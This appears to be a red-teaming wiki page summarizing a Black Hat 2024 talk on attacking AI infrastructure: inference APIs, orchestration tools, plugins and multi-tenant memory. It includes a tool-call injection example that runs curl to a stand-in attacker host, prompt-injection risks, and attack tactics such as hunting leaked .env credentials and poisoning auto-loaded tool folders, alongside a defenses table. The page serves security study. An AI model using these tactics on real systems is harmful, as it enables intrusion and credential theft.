---
description: >-
  Key findings from Black Hat USA 2024's briefing "Isolation or Hallucination:
  Hacking AI Infrastructure Providers for Fun and Weights."
---

# Hacking AI Infrastructure Providers

## Hacking AI Infrastructure Providers

While most LLM red teaming focuses on model behavior, a critical frontier lies in attacking the **underlying infrastructure** that hosts, delivers, or orchestrates LLM workloads.

This includes threats to:

* Cloud-hosted inference APIs (OpenAI, Azure, Bedrock, etc.)
* Managed orchestration platforms (LangChain, Fixie, CrewAI)
* GPU providers and kernel-level ML modules
* Vector databases, embeddings APIs, or memory stores

***

### ☁️ Cloud Provider Attack Surfaces

#### 1. **Model-as-a-Service APIs**

* Exploitable misconfigurations (e.g., no rate limiting, exposed dev endpoints)
* Prompt injection that triggers unintended internal behavior
* Payloads that cause denial-of-service (context abuse, memory overflow)

#### 2. **Token Leakage via API Headers**

* Tools or proxies that log requests may leak API keys
* Response metadata can reveal model identity, pricing tier, etc.

#### 3. **Shared Tenancy Leakage**

* Poor isolation may allow timing attacks or vector store leakage across customers

***

### 🧠 Orchestration-Level Risks

#### 1. **Tool Call Injection**

If user input is passed directly into `tool_name(args)` format without sanitization:

```python
user_input = "toolX(); os.system('curl attacker.site')"
```

#### 2. **Insecure Memory / Context Management**

* Agent history files saved insecurely
* Persistent memory shared across users

#### 3. **Remote Plugin Execution**

Some plugins fetch remote code or eval JSON fetched from the web — an RCE vector

***

### 🔧 Red Team TTPs

* Scan for leaked credentials or public `.env` files in GitHub or Colab
* Abuse auto-load agents (e.g., "tools/" folder) via symbolic links or poisoned code
* Trigger memory-heavy prompts to induce DoS (esp. in multi-tenant settings)
* Probe vector store boundaries using adversarial embeddings

***

### 🛡️ Defenses

| Area             | Control                                                    |
| ---------------- | ---------------------------------------------------------- |
| API Gateway      | Rate limiting, token scoping, origin pinning               |
| Multi-Tenancy    | Namespace isolation for memory, embeddings, vector queries |
| Plugin Execution | Require signed manifest and deny remote evals              |
| Agent Tools      | Whitelist allowed imports or enforce sandboxing            |
| Logging          | Avoid logging user inputs or tokens in plaintext           |

***

### 🔗 Related Pages

* [In-Kernel ML Risks](https://chatgpt.com/g/runtime-surfaces/in-kernel-ml-risks.md)
* [OSS API Abuse](https://chatgpt.com/g/runtime-surfaces/oss-api-abuse.md)
* [Multi-Tenant Isolation Patterns](https://chatgpt.com/g/runtime-surfaces/multi-tenant-patterns.md)
* [Prompt Injection](https://chatgpt.com/g/g-p-686fcdd11388819199552779068fc4c1-ai-red-teaming-notebook/c/prompt-injection/overview.md)
